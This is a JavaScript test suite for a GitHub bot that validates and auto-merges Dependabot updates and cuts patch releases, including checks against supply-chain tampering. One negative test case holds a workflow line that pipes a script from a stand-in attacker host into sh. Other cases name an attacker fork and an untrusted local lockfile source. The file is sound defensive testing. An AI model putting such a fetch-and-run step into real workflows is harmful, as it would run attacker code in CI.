import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import {
  ciState, compatibleDependencyChange, compatibleVersion, ensureTag, nextRelease, ownedPullRequest,
  planFromBody, reconcile, releaseBody, releaseBranch, releasePlan, requiredChecks, validReleaseChange,
} from "./release-automation.mjs";

const repository = "example/terminal-emulator-mcp";
const repo = { owner: "example", repo: "terminal-emulator-mcp" };
const appSlug = "release-helper";
const json = (value) => `${JSON.stringify(value, null, 2)}\n`;
const clone = (value) => structuredClone(value);
const paths = ["package.json", "package-lock.json", "README.md"];
const modified = (...names) => names.map((filename) => ({ filename, status: "modified" }));
const bot = { login: "dependabot[bot]", type: "Bot" };
const app = { login: `${appSlug}[bot]`, type: "Bot" };

function pr(number = 1, options = {}) {
  return {
    number, node_id: `PR_${number}`, user: bot, state: "open", draft: false, auto_merge: null,
    title: "Bump widget", body: "", merged_at: null, merge_commit_sha: null,
    base: { ref: "main", sha: "base", repo: { full_name: repository } },
    head: { ref: `dependabot/npm_and_yarn/widget-${number}`, sha: `head-${number}`, repo: { full_name: repository } },
    ...options,
  };
}

function packageFiles(dependencyVersion = "1.2.3", version = "0.9.0", readme = "Use terminal-emulator-mcp@0.9.0.\n") {
  const root = { name: "terminal-emulator-mcp", version, dependencies: { widget: dependencyVersion } };
  return {
    "package.json": json(root),
    "package-lock.json": json({
      name: root.name, version, lockfileVersion: 3, requires: true,
      packages: {
        "": root,
        "node_modules/widget": {
          version: dependencyVersion, resolved: `https://registry.npmjs.org/widget/-/widget-${dependencyVersion}.tgz`,
          integrity: "sha512-widget",
        },
      },
    }),
    "README.md": readme,
  };
}

function compatible(before, after, changed = modified("package.json", "package-lock.json"), pull = pr()) {
  return compatibleDependencyChange(pull, changed, before, after, repository, "main");
}

function successChecks() {
  return requiredChecks.map((name, index) => ({
    name, id: index + 10, status: "completed", conclusion: "success", app: { slug: "github-actions" },
  }));
}

test("caret compatibility respects stable, zero-major, and ordinary prerelease boundaries", () => {
  for (const [before, after, expected] of [
    ["1.2.3", "1.9.0", true], ["1.2.3", "2.0.0", false], ["1.2.3", "1.2.3", false],
    ["0.2.3", "0.2.9", true], ["0.2.3", "0.3.0", false], ["0.0.3", "0.0.4", false],
    ["1.2.3-beta.1", "1.2.3-beta.2", true], ["1.2.3-beta.1", "1.2.3", true],
    ["1.2.3-beta.1", "1.3.0-beta.1", false], ["1.2.3", "1.3.0-beta.1", false],
    ["v1.2.3", "1.2.4", false], ["latest", "1.2.4", false], ["1.2.3", "1.2.2", false],
  ]) assert.equal(compatibleVersion(before, after), expected, `${before} -> ${after}`);
});

test("only the verified bot in this repository targeting the default branch is trusted", () => {
  assert.equal(ownedPullRequest(pr(), repository, "main", bot.login), true);
  for (const pull of [
    pr(1, { user: { ...bot, type: "User" } }),
    pr(1, { user: { ...bot, login: "dependabot" } }),
    pr(1, { head: { ...pr().head, repo: { full_name: "attacker/fork" } } }),
    pr(1, { base: { ...pr().base, ref: "development" } }),
  ]) assert.equal(compatible(packageFiles(), packageFiles("1.2.4"), undefined, pull), false);
});

test("direct npm updates validate both declared ranges and locked versions", () => {
  assert.equal(compatible(packageFiles(), packageFiles("1.2.4")), true);
  for (const version of ["2.0.0", "0.9.0"]) {
    assert.equal(compatible(packageFiles(), packageFiles(version)), false);
  }
  const next = packageFiles("1.2.4");
  const manifest = JSON.parse(next["package.json"]);
  manifest.dependencies.widget = ">=1.2.4";
  next["package.json"] = json(manifest);
  assert.equal(compatible(packageFiles(), next), false);
  assert.equal(compatible(packageFiles(), packageFiles("1.2.4"), modified("src/index.ts")), false);
  assert.equal(compatible(packageFiles(), packageFiles("1.2.4"), [
    { filename: "package.json", status: "renamed", previous_filename: "original.json" },
  ]), false);
});

test("compatible direct updates may replace their transitive dependency tree", () => {
  const before = packageFiles();
  const after = packageFiles("1.3.0");
  const oldLock = JSON.parse(before["package-lock.json"]);
  oldLock.packages["node_modules/old-child"] = {
    version: "1.0.0", resolved: "https://registry.npmjs.org/old-child/-/old-child-1.0.0.tgz", integrity: "sha512-old",
  };
  before["package-lock.json"] = json(oldLock);
  const newLock = JSON.parse(after["package-lock.json"]);
  newLock.packages["node_modules/new-child"] = {
    version: "3.0.0", resolved: "https://registry.npmjs.org/new-child/-/new-child-3.0.0.tgz", integrity: "sha512-new",
  };
  newLock.packages["node_modules/widget"].dependencies = { "new-child": "^3.0.0" };
  after["package-lock.json"] = json(newLock);
  assert.equal(compatible(before, after), true);
  newLock.packages["node_modules/new-child"].resolved = "file:../../untrusted";
  after["package-lock.json"] = json(newLock);
  assert.equal(compatible(before, after), false);
});

test("lockfile-only updates require compatible versions when no direct dependency changed", () => {
  const before = packageFiles();
  const oldLock = JSON.parse(before["package-lock.json"]);
  oldLock.packages["node_modules/child"] = {
    version: "1.0.0", resolved: "https://registry.npmjs.org/child/-/child-1.0.0.tgz", integrity: "sha512-old",
  };
  before["package-lock.json"] = json(oldLock);
  for (const [version, expected] of [["1.0.1", true], ["2.0.0", false]]) {
    const nextLock = clone(oldLock);
    Object.assign(nextLock.packages["node_modules/child"], {
      version, resolved: `https://registry.npmjs.org/child/-/child-${version}.tgz`, integrity: "sha512-new",
    });
    assert.equal(compatible(before, { ...before, "package-lock.json": json(nextLock) },
      modified("package-lock.json")), expected);
  }
});

test("Actions updates change only recognizable compatible action tags", () => {
  const path = ".github/workflows/ci.yml";
  const before = { [path]: "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v7.0.0\n" };
  const after = { [path]: before[path].replace("@v7.0.0", "@v7.0.1") };
  assert.equal(compatible(before, after, modified(path)), true);
  for (const text of [
    before[path].replace("@v7.0.0", "@v8.0.0"),
    before[path].replace("@v7.0.0", "@main"),
    before[path].replace("actions/checkout@v7.0.0", "attacker/checkout@v7.0.1"),
    `${after[path]}      - run: curl https://attacker.example/run | sh\n`,
  ]) assert.equal(compatible(before, { [path]: text }, modified(path)), false);
});

test("required CI uses each newest trusted check and never accepts a skipped check", () => {
  const checks = successChecks();
  assert.equal(ciState(checks), "passed");
  assert.equal(ciState(checks.slice(1)), "pending");
  assert.equal(ciState([...checks, { ...checks[0], id: 100, status: "in_progress", conclusion: null }]), "pending");
  assert.equal(ciState([...checks, { ...checks[0], id: 100, conclusion: "skipped" }]), "failed");
  assert.equal(ciState(checks.map((check) => ({ ...check, app: { slug: "pretend-actions" } }))), "pending");
});

test("release changes contain exactly the patch version and any existing README pins", () => {
  for (const readme of ["Use terminal-emulator-mcp@0.9.0.\n", "Installation instructions.\n"]) {
    const before = packageFiles("1.2.3", "0.9.0", readme);
    const expected = packageFiles("1.2.3", "0.9.1", readme.replace("@0.9.0", "@0.9.1"));
    const result = nextRelease(before);
    assert.equal(result.version, "0.9.1");
    assert.deepEqual(result.files, expected);
    const pull = pr(2, {
      user: app, head: { ...pr().head, ref: releaseBranch },
      body: releaseBody({ version: "0.9.1", pullRequests: [1] }),
    });
    const changed = paths.filter((path) => before[path] !== expected[path]);
    assert.equal(validReleaseChange(pull, modified(...changed), before, expected, repository, "main", app.login), true);
    assert.equal(validReleaseChange(pull, modified(...changed, "LICENSE"), before, expected,
      repository, "main", app.login), false);
    assert.equal(validReleaseChange({ ...pull, user: bot }, modified(...changed), before, expected,
      repository, "main", app.login), false);
  }
});

test("release plans coalesce unique PR numbers and reject malformed body markers", () => {
  assert.deepEqual(releasePlan("0.9.1", [4, 1, 4, 2]), { version: "0.9.1", pullRequests: [1, 2, 4] });
  assert.equal(releasePlan("0.9.1", []), null);
  assert.equal(planFromBody("<!-- terminal-emulator-mcp-dependency-release {} -->"), null);
  assert.deepEqual(planFromBody(releaseBody({ version: "0.9.1", pullRequests: [1] })),
    { version: "0.9.1", pullRequests: [1] });
});

test("README rewriting only updates complete package-version pins", () => {
  const readme = "Use terminal-emulator-mcp@0.9.0 or terminal-emulator-mcp@0.9.0-rc.1.\n";
  assert.equal(nextRelease(packageFiles("1.2.3", "0.9.0", readme)).files["README.md"],
    "Use terminal-emulator-mcp@0.9.1 or terminal-emulator-mcp@0.9.0-rc.1.\n");
});

test("tags are idempotent, support annotated tags, and never move an existing tag", async () => {
  let object = { type: "tag", sha: "annotation" };
  const created = [];
  const github = { rest: { git: {
    getRef: async () => {
      if (!object) throw Object.assign(new Error("not found"), { status: 404 });
      return { data: { object } };
    },
    getTag: async () => ({ data: { object: { type: "commit", sha: "merged" } } }),
    createRef: async (input) => { created.push(input); object = { type: "commit", sha: input.sha }; },
  } } };
  assert.equal(await ensureTag(github, repo, "v0.9.1", "merged"), false);
  await assert.rejects(ensureTag(github, repo, "v0.9.1", "different"), /never moved/);
  assert.deepEqual(created, []);
  object = null;
  assert.equal(await ensureTag(github, repo, "v0.9.1", "merged"), true);
  assert.deepEqual(created, [{ ...repo, ref: "refs/tags/v0.9.1", sha: "merged" }]);
});

// The GitHub fixture preserves ancestry, file diffs, refs, and PR state across reconciliations.
function fixture() {
  const commits = new Map();
  const refs = new Map();
  const pulls = [];
  const checkRuns = new Map();
  const writes = [];
  const reads = [];
  const trees = new Map();
  const errors = { notFound: () => Object.assign(new Error("Not Found"), { status: 404 }) };
  let freshPull = (pull) => pull;
  let beforeMerge = () => {};
  const commit = (sha, files, parent, author = app) => {
    const value = {
      sha, files: clone(files), parents: parent ? [{ sha: parent }] : [],
      commit: { tree: { sha: `tree-${sha}` } }, author,
    };
    commits.set(sha, value);
    trees.set(value.commit.tree.sha, value.files);
    return value;
  };
  const ancestors = (sha) => {
    const result = [];
    while (sha) {
      result.push(sha);
      sha = commits.get(sha)?.parents[0]?.sha;
    }
    return result;
  };
  const resolve = (ref) => refs.get(ref) ?? ref;
  const comparison = (base, head) => {
    base = resolve(base);
    head = resolve(head);
    const left = ancestors(base);
    const right = ancestors(head);
    const mergeBase = left.find((sha) => right.includes(sha));
    if (!mergeBase) throw Object.assign(new Error(`No merge base: ${base}, ${head}`), { status: 404 });
    const status = base === head ? "identical" : right.includes(base) ? "ahead"
      : left.includes(head) ? "behind" : "diverged";
    const before = commits.get(base)?.files ?? {};
    const after = commits.get(head)?.files ?? {};
    const files = [...new Set([...Object.keys(before), ...Object.keys(after)])]
      .filter((filename) => before[filename] !== after[filename])
      .map((filename) => ({
        filename, status: before[filename] === undefined ? "added"
          : after[filename] === undefined ? "removed" : "modified",
      }));
    return { status, merge_base_commit: { sha: mergeBase }, files };
  };
  commit("base", packageFiles());
  refs.set("heads/main", "base");
  const getPull = (number) => {
    const pull = pulls.find((value) => value.number === number);
    assert.ok(pull, `Unknown PR ${number}`);
    if (pull.state === "open") {
      pull.base.sha = refs.get("heads/main");
      pull.head.sha = refs.get(`heads/${pull.head.ref}`) ?? pull.head.sha;
    }
    return pull;
  };
  const github = {
    rest: {
      repos: {
        get: async () => ({ data: { default_branch: "main" } }),
        getContent: async ({ ref, path }) => {
          reads.push({ ref, path });
          const text = commits.get(resolve(ref))?.files[path];
          if (text === undefined) throw errors.notFound();
          return { data: { type: "file", encoding: "base64", content: Buffer.from(text).toString("base64") } };
        },
        getCommit: async ({ ref }) => {
          const data = commits.get(resolve(ref));
          if (!data) throw errors.notFound();
          return { data: clone(data) };
        },
        compareCommits: async ({ base, head }) => ({ data: comparison(base, head) }),
        listCommits: async ({ sha }) => ({ data: ancestors(sha).map((ref) => commits.get(ref)) }),
      },
      pulls: {
        list: async () => ({ data: pulls.map((pull) => clone(getPull(pull.number))) }),
        get: async ({ pull_number }) => ({ data: clone(freshPull(getPull(pull_number))) }),
        listFiles: async ({ pull_number }) => {
          const pull = getPull(pull_number);
          const head = pull.merged_at ? pull.merge_commit_sha : pull.head.sha;
          const base = pull.merged_at ? commits.get(head).parents[0].sha
            : comparison(pull.base.sha, head).merge_base_commit.sha;
          const before = commits.get(base).files;
          const after = commits.get(head).files;
          return { data: [...new Set([...Object.keys(before), ...Object.keys(after)])]
            .filter((path) => before[path] !== after[path])
            .map((filename) => ({
              filename, status: before[filename] === undefined ? "added"
                : after[filename] === undefined ? "removed" : "modified",
            })) };
        },
        create: async (input) => {
          writes.push({ operation: "createPull", ...input });
          const value = pr(pulls.length + 100, {
            user: app, title: input.title, body: input.body,
            base: { ref: input.base, sha: refs.get(`heads/${input.base}`), repo: { full_name: repository } },
            head: { ref: input.head, sha: refs.get(`heads/${input.head}`), repo: { full_name: repository } },
          });
          pulls.push(value);
          return { data: clone(value) };
        },
        update: async (input) => {
          writes.push({ operation: "updatePull", ...input });
          Object.assign(getPull(input.pull_number), { title: input.title, body: input.body });
          return { data: clone(getPull(input.pull_number)) };
        },
        merge: async (input) => {
          beforeMerge();
          const pull = getPull(input.pull_number);
          if (pull.head.sha !== input.sha) throw Object.assign(new Error("Head SHA changed"), { status: 409 });
          writes.push({ operation: "mergePull", ...input });
          return { data: { merged: true, sha: "merge-result" } };
        },
      },
      checks: {
        listForRef: async ({ ref }) => ({
          data: { total_count: checkRuns.get(ref)?.length ?? 0, check_runs: checkRuns.get(ref) ?? [] },
        }),
      },
      git: {
        getRef: async ({ ref }) => {
          if (!refs.has(ref)) throw errors.notFound();
          return { data: { object: { type: "commit", sha: refs.get(ref) } } };
        },
        createRef: async (input) => {
          const ref = input.ref.replace(/^refs\//, "");
          if (refs.has(ref)) throw Object.assign(new Error("Exists"), { status: 422 });
          writes.push({ operation: "createRef", ...input });
          refs.set(ref, input.sha);
          return { data: {} };
        },
        updateRef: async (input) => {
          assert.equal(input.ref, `heads/${releaseBranch}`, "Only the reserved release branch may be rewritten");
          writes.push({ operation: "updateRef", ...input });
          refs.set(input.ref, input.sha);
          return { data: {} };
        },
        createTree: async (input) => {
          writes.push({ operation: "createTree", ...input });
          const sha = `created-tree-${writes.length}`;
          trees.set(sha, { ...trees.get(input.base_tree),
            ...Object.fromEntries(input.tree.map(({ path, content }) => [path, content])) });
          return { data: { sha } };
        },
        createCommit: async (input) => {
          writes.push({ operation: "createCommit", ...input });
          const sha = `created-commit-${writes.length}`;
          commit(sha, trees.get(input.tree), input.parents[0]);
          return { data: { sha } };
        },
      },
    },
    graphql: async (query, input) => { writes.push({ operation: "autoMerge", query, ...input }); },
  };
  github.paginate = async (method, input, map) => {
    const response = await method(input);
    // Octokit normalizes collection wrappers before invoking the optional mapping callback.
    if (!Array.isArray(response.data)) response.data = response.data.check_runs;
    return map ? [].concat(map(response)) : response.data;
  };
  github.paginate.iterator = async function* (method, input) { yield await method(input); };
  const run = (context = {}) => reconcile({
    github, context: { repo, eventName: "workflow_run", ref: "refs/heads/main", ...context },
    core: { info() {} }, appSlug,
  });
  function dependency(number = 1, { merged = false, files = packageFiles("1.2.4"), base = "base" } = {}) {
    const head = `dependency-${number}`;
    commit(head, files, base, bot);
    const pull = pr(number, {
      head: { ...pr(number).head, sha: head },
      base: { ...pr(number).base, sha: base },
      ...(merged ? { state: "closed", merged_at: "2026-09-20T10:00:00Z", merge_commit_sha: head } : {}),
    });
    pulls.push(pull);
    if (merged) refs.set("heads/main", head);
    return pull;
  }
  return {
    github, run, commits, refs, pulls, writes, reads, checkRuns, commit, dependency,
    set freshPull(value) { freshPull = value; },
    set beforeMerge(value) { beforeMerge = value; },
  };
}

test("reconciliation merges a compatible dependency only after all CI passes", async () => {
  const f = fixture();
  const pull = f.dependency();
  await f.run();
  assert.deepEqual(f.writes, []);
  f.checkRuns.set(pull.head.sha, successChecks());
  await f.run();
  assert.deepEqual(f.writes.map((write) => write.operation), ["mergePull"]);
  assert.equal(f.writes[0].sha, "dependency-1", "Merge must atomically require the validated head");
  assert.equal(f.writes[0].merge_method, "squash");
});

test("reconciliation leaves a PR whose head changed during CI inspection untouched", async () => {
  const f = fixture();
  const pull = f.dependency();
  f.checkRuns.set(pull.head.sha, successChecks());
  f.freshPull = (value) => ({ ...value, head: { ...value.head, sha: "replacement" } });
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("a head change after the final PR read is rejected by the atomic merge gate", async () => {
  const f = fixture();
  const pull = f.dependency();
  f.checkRuns.set(pull.head.sha, successChecks());
  f.beforeMerge = () => { pull.head.sha = "replacement"; };
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("reconciliation reads workflow files for recognized Actions updates", async () => {
  const f = fixture();
  const path = ".github/workflows/ci.yml";
  f.commits.get("base").files[path] = "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v7.0.0\n";
  const files = {
    ...f.commits.get("base").files, [path]: "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v7.0.1\n",
  };
  const pull = f.dependency(1, { files });
  f.checkRuns.set(pull.head.sha, successChecks());
  await f.run();
  assert.deepEqual(f.writes.map((write) => write.operation), ["mergePull"]);
});

test("unrecognized added workflow files remain manual without interrupting reconciliation", async () => {
  const f = fixture();
  f.dependency(1, { files: {
    ...packageFiles(), ".github/workflows/unrecognized.yml": "jobs:\n  arbitrary:\n    steps: []\n",
  } });
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("merged dependencies coalesce into one version PR and retries retain its commit", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  f.dependency(2, { merged: true, base: "dependency-1", files: packageFiles("1.2.5") });
  await f.run();
  const release = f.pulls.find((pull) => pull.user.login === app.login);
  assert.ok(release);
  assert.equal(release.title, "Release 0.9.1");
  assert.deepEqual(planFromBody(release.body), { version: "0.9.1", pullRequests: [1, 2] });
  assert.equal(f.commits.get(release.head.sha).files["package.json"], packageFiles("1.2.5", "0.9.1")["package.json"]);
  const created = f.writes.length;
  await f.run();
  assert.equal(f.writes.length, created, "A duplicate event must neither create a commit nor update a PR");
  f.checkRuns.set(release.head.sha, successChecks());
  await f.run();
  assert.deepEqual(f.writes.slice(created).map((write) => write.operation), ["mergePull"]);
});

test("an in-flight compatible dependency postpones merging the release PR", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  await f.run();
  const release = f.pulls.at(-1);
  f.checkRuns.set(release.head.sha, successChecks());
  const queued = f.dependency(2, { base: "dependency-1", files: packageFiles("1.2.5") });
  const count = f.writes.length;
  await f.run();
  assert.equal(f.writes.length, count);
  f.checkRuns.set(queued.head.sha, successChecks().map((check) => ({ ...check, conclusion: "failure" })));
  await f.run();
  assert.equal(f.writes.at(-1).operation, "mergePull", "Failed dependency CI must not indefinitely hold the release");
});

test("dependencies from rewritten history do not become pending releases", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  f.commit("rewritten", packageFiles(), "base");
  f.refs.set("heads/main", "rewritten");
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("PRs from history with no common ancestor do not block current releases", async () => {
  const f = fixture();
  const old = f.dependency(1, { merged: true });
  f.commit("unrelated-root", packageFiles());
  f.commit(old.merge_commit_sha, packageFiles("1.2.4"), "unrelated-root");
  f.refs.set("heads/main", "base");
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("a matching release tag bypasses historical CI and file reads", async () => {
  const f = fixture();
  f.pulls.push(pr(5, {
    user: app, state: "closed", merged_at: "2026-09-19T10:00:00Z", merge_commit_sha: "missing-history",
    body: releaseBody({ version: "0.8.9", pullRequests: [1] }),
    head: { ...pr().head, ref: releaseBranch },
  }));
  f.refs.set("tags/v0.8.9", "missing-history");
  await f.run();
  assert.deepEqual(f.writes, []);
  assert.equal(f.reads.some((read) => read.ref === "missing-history"), false);
});

test("release validation recovers an App-owned orphan branch without duplicating its commit", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  f.commit("orphan", packageFiles("1.2.4", "0.9.1", "Use terminal-emulator-mcp@0.9.1.\n"), "dependency-1");
  f.refs.set(`heads/${releaseBranch}`, "orphan");
  await f.run();
  assert.deepEqual(f.writes.map((write) => write.operation), ["createPull"]);
  assert.equal(f.pulls.at(-1).head.sha, "orphan");
});

test("an old App release PR does not authorize overwriting an unrelated orphan branch", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  f.pulls.push(pr(9, {
    user: app, state: "closed", head: { ...pr().head, ref: releaseBranch },
  }));
  f.commit("unrelated", packageFiles(), "base", { login: "human", type: "User" });
  f.refs.set(`heads/${releaseBranch}`, "unrelated");
  await assert.rejects(f.run(), /App-owned/);
  assert.deepEqual(f.writes, [], "Do not even prepare a version commit until branch ownership is verified");
});

test("an App-owned orphan with unexpected source edits requires manual review", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  f.commit("orphan", {
    ...packageFiles("1.2.4", "0.9.1", "Use terminal-emulator-mcp@0.9.1.\n"), "src/extra.ts": "unrelated",
  }, "dependency-1");
  f.refs.set(`heads/${releaseBranch}`, "orphan");
  await assert.rejects(f.run(), /version-only/);
  assert.deepEqual(f.writes, []);
});

test("an updated default branch refreshes a version PR without dropping concurrent source changes", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  await f.run();
  const release = f.pulls.at(-1);
  const originalHead = release.head.sha;
  f.checkRuns.set(originalHead, successChecks());
  f.commit("concurrent-main", { ...packageFiles("1.2.4"), "src/feature.ts": "new feature\n" }, "dependency-1");
  f.refs.set("heads/main", "concurrent-main");
  const count = f.writes.length;
  await f.run();
  const updatedHead = f.refs.get(`heads/${releaseBranch}`);
  assert.notEqual(updatedHead, originalHead);
  assert.equal(f.commits.get(updatedHead).parents[0].sha, "concurrent-main");
  assert.equal(f.commits.get(updatedHead).files["src/feature.ts"], "new feature\n");
  assert.equal(f.writes.slice(count).some((write) => write.operation === "mergePull"), false);
  assert.equal(f.pulls.length, 2);
});

test("merged version PRs get one tag, and later runs need no historical checks", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  await f.run();
  const release = f.pulls.at(-1);
  f.commit("released", f.commits.get(release.head.sha).files, "dependency-1");
  f.refs.set("heads/main", "released");
  Object.assign(release, { state: "closed", merged_at: "2026-09-21T10:00:00Z", merge_commit_sha: "released" });
  f.checkRuns.set(release.head.sha, successChecks());
  const count = f.writes.length;
  await f.run();
  assert.deepEqual(f.writes.slice(count), [{
    operation: "createRef", ...repo, ref: "refs/tags/v0.9.1", sha: "released",
  }]);
  f.checkRuns.clear();
  await f.run();
  assert.equal(f.writes.length, count + 1);
});

test("release tagging refuses unvalidated files or a missing required CI check", async () => {
  for (const tampered of [false, true]) {
    const f = fixture();
    f.dependency(1, { merged: true });
    await f.run();
    const release = f.pulls.at(-1);
    const files = clone(f.commits.get(release.head.sha).files);
    if (tampered) files["package.json"] = files["package.json"].replace("1.2.4", "2.0.0");
    f.commit("released", files, "dependency-1");
    f.refs.set("heads/main", "released");
    Object.assign(release, { state: "closed", merged_at: "2026-09-21T10:00:00Z", merge_commit_sha: "released" });
    const count = f.writes.length;
    await assert.rejects(f.run(), tampered ? /version-only/ : /successful required CI/);
    assert.equal(f.writes.length, count);
  }
});

test("the version boundary prevents re-releasing dependencies covered by a manual release", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  f.commit("manual-version", packageFiles("1.2.4", "0.10.0"), "dependency-1");
  f.refs.set("heads/main", "manual-version");
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("required branch rules rejecting a merge leave the PR for a later reconciliation", async () => {
  const f = fixture();
  const pull = f.dependency();
  f.checkRuns.set(pull.head.sha, successChecks());
  f.beforeMerge = () => { throw Object.assign(new Error("Base is behind"), { status: 405 }); };
  await f.run();
  assert.deepEqual(f.writes, []);
  f.beforeMerge = () => {};
  await f.run();
  assert.equal(f.writes.at(-1).operation, "mergePull");
});

test("updating a release PR body never adopts an unvalidated replacement head", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  await f.run();
  const release = f.pulls.at(-1);
  const checkedHead = release.head.sha;
  release.body = releaseBody({ version: "0.9.1", pullRequests: [99] });
  f.checkRuns.set(checkedHead, successChecks());
  f.checkRuns.set("unvalidated", successChecks());
  const update = f.github.rest.pulls.update;
  f.github.rest.pulls.update = async (input) => {
    f.refs.set(`heads/${releaseBranch}`, "unvalidated");
    return update(input);
  };
  const count = f.writes.length;
  await f.run();
  assert.deepEqual(f.writes.slice(count).map((write) => write.operation), ["updatePull"]);
});

test("a newer pending CI rerun blocks merging even when the first check read passed", async () => {
  const f = fixture();
  const pull = f.dependency();
  f.checkRuns.set(pull.head.sha, successChecks());
  f.freshPull = (value) => {
    f.checkRuns.set(pull.head.sha, successChecks().map((check) => ({
      ...check, id: check.id + 100, status: "queued", conclusion: null,
    })));
    return value;
  };
  await f.run();
  assert.deepEqual(f.writes, []);
});

test("a changed base defers version branch updates until pending merges can be recomputed", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  const pull = f.dependency(2, { base: "dependency-1", files: packageFiles("1.2.5") });
  f.checkRuns.set(pull.head.sha, successChecks());
  f.beforeMerge = () => {
    f.commit("concurrent-main", packageFiles("1.2.5"), "dependency-1");
    f.refs.set("heads/main", "concurrent-main");
  };
  await f.run();
  assert.deepEqual(f.writes.map((write) => write.operation), ["mergePull"]);
});

test("a release branch changed while preparing its refresh is left untouched", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  await f.run();
  const release = f.pulls.at(-1);
  f.commit("concurrent-main", { ...packageFiles("1.2.4"), "src/feature.ts": "new feature\n" }, "dependency-1");
  f.refs.set("heads/main", "concurrent-main");
  const createCommit = f.github.rest.git.createCommit;
  f.github.rest.git.createCommit = async (input) => {
    const result = await createCommit(input);
    f.refs.set(`heads/${releaseBranch}`, "concurrent-human-commit");
    return result;
  };
  const count = f.writes.length;
  await f.run();
  assert.equal(f.refs.get(`heads/${releaseBranch}`), "concurrent-human-commit");
  assert.equal(f.writes.slice(count).some((write) => ["updateRef", "mergePull"].includes(write.operation)), false);
  assert.equal(f.pulls.at(-1).number, release.number);
});

test("a release head replaced before the initial branch read is not accepted as the refresh baseline", async () => {
  const f = fixture();
  f.dependency(1, { merged: true });
  await f.run();
  const release = f.pulls.at(-1);
  const validatedHead = release.head.sha;
  f.commit("concurrent-main", { ...packageFiles("1.2.4"), "src/feature.ts": "new feature\n" }, "dependency-1");
  f.refs.set("heads/main", "concurrent-main");
  const getRef = f.github.rest.git.getRef;
  let replaced = false;
  f.github.rest.git.getRef = async (input) => {
    if (!replaced && input.ref === `heads/${releaseBranch}`) {
      replaced = true;
      const files = clone(f.commits.get(validatedHead).files);
      const manifest = JSON.parse(files["package.json"]);
      manifest.scripts = { human: "echo preserve this work" };
      files["package.json"] = json(manifest);
      f.commit("unvalidated-human-head", files, validatedHead, { login: "human", type: "User" });
      f.refs.set(`heads/${releaseBranch}`, "unvalidated-human-head");
    }
    return getRef(input);
  };
  const count = f.writes.length;
  await f.run();
  assert.equal(f.refs.get(`heads/${releaseBranch}`), "unvalidated-human-head");
  assert.equal(f.writes.length, count, "A mismatched PR/ref snapshot must defer before preparing a refresh");
});

test("equal-target tag creation races succeed without rewriting the tag", async () => {
  for (const target of ["merged", "different"]) {
    let created = false;
    const github = { rest: { git: {
      getRef: async () => {
        if (!created) throw Object.assign(new Error("missing"), { status: 404 });
        return { data: { object: { type: "commit", sha: target } } };
      },
      createRef: async () => {
        created = true;
        throw Object.assign(new Error("already exists"), { status: 422 });
      },
    } } };
    if (target === "merged") assert.equal(await ensureTag(github, repo, "v0.9.1", "merged"), true);
    else await assert.rejects(ensureTag(github, repo, "v0.9.1", "merged"), /different target/);
  }
});

test("privileged manual dispatch is limited to the default branch before credentials are made available", () => {
  const workflow = readFileSync(new URL("../.github/workflows/dependency-release.yml", import.meta.url), "utf8");
  const condition = workflow.match(/reconcile:\n    if: >-\n([\s\S]*?)\n    runs-on:/)?.[1].trim();
  assert.ok(condition);
  const evaluate = new Function("github", "vars", "format", `return (${condition});`);
  const enabled = (github, vars) => evaluate(github, vars, (pattern, value) => pattern.replace("{0}", value));
  const event = {
    repository: { default_branch: "main" }, pull_request: { base: { ref: "main" } },
  };
  const vars = { RELEASE_APP_ID: "123" };
  for (const [event_name, ref, expected] of [
    ["workflow_dispatch", "refs/heads/main", true],
    ["workflow_dispatch", "refs/heads/untrusted", false],
    ["workflow_dispatch", "refs/tags/v0.9.0", false],
    ["workflow_run", "refs/heads/main", true],
    ["pull_request_target", "refs/heads/main", true],
  ]) assert.equal(enabled({ event_name, ref, event }, vars), expected, `${event_name} on ${ref}`);
});
